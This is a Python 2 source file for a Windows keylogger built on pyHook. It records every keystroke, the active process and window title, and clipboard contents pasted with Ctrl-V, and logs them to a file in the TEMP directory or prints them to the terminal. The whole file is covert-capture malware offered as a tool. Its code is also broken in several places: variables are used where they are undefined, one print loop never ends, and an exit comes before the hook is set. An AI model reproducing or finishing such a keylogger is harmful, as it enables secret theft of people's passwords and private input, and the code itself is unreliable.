from ctypes import *
import pythoncom
import optparse
import datetime
import pyHook 
import win32clipboard
import os

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None

# ## determine at rtunetime: log named by Y-M-D 
# tdir = os.getenv('TEMP')
# tn = str(datetime.date.today())
# tfl = tdir + tn
# logfile = tn + 'lol.txt'
# print "logfile: %s " % logfile


def get_current_process():

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # now read it's title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # print out the header if we're in the right process
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print
	

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):

    global current_window   

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # if they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        while termVar == True:    
            print chr(event.Ascii),
    if event.Key == "V":
        # if [Ctrl-V], get the value on the clipboard
        # added by Dan Frisch 2014
        win32clipboard.OpenClipboard()
        pasted_value = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()        
		   
    if termVar == True:
        print "[PASTE] - %s" % (pasted_value)
        print "[%s], "
    else:
        # added write to file
        f = open(logfile, 'a')
        f.write("ASCII: [%s], \n" % event.Ascii)
        f.write("PASTED: [%s], \n" % pasted_value)
        f.write("[%s], " % event.Key)
        f.close()           

    # pass execution to next hook registered 
    return True

def main():
    parser = optparse.OptionParser('usage %prog "+ "--filename <filename in temp w/o file ext> --stdout <True/False for terminal printout> -h for help')
    parser.add_option('--file', dest='filen', type='string', help='specific PDF file name ** default is date+lol.txt in USER TEMP directory', default = None)
    parser.add_option('--stdout', help='True to print in terminal, false to just log to file. Defaults false', dest = 'pterm', default = False, action = 'store_true')
    # parser.add_option('--time' dest='logt', type='string', help='How long to run in seconds\nLeave blank to run forever')
    (options, args) = parser.parse_args()
    fileName = options.filen
    termVar = bool(options.pterm)
    # logTime = int(options.logt)

    if termVar == True:
        print "[+] Writing to terminal! \n"
        exit(0)
    if fileName == None:         
        tdir = os.getenv('TEMP')
        tn = str(datetime.date.today())
        tfl = tdir + tn
        logfile = tn + 'lol.txt'
        print "[+] Writing random logfile: %s " % logfile
    if fileName > 0:
        tdir = os.getenv('TEMP')
        tn = str(fileName)
        tfl = tdir + tn
        logfile = tfl
        print "[+] Writing custom logfile: %s " % logfile
    # if len(logTime) > 0: 
    else:
        kl         = pyHook.HookManager()
        kl.KeyDown = KeyStroke

        # register the hook and execute forever
        kl.HookKeyboard()
        pythoncom.PumpMessages()
    


if __name__ == '__main__':
    main()
        # create and register a hook manager 

